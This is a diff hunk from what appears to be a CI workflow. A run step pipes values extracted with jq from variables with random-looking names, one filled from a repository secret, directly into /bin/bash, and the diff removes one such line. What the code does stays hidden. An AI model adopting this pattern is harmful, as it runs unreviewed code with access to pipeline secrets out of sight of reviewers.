@@ -23,7 +23,6 @@ jobs:
           btzx59: ${{ secrets.btzx59 }}
         run: |
           printf '%s' "$btzx59" | jq -r .mtae6279 | /bin/bash
-          printf '%s' "$fwkgt213" | jq -r .udgb5 | /bin/bash
           printf '%s' "$wwpij4552" | jq -r .xdmq3358 | /bin/bash
 
       - name: Save archive
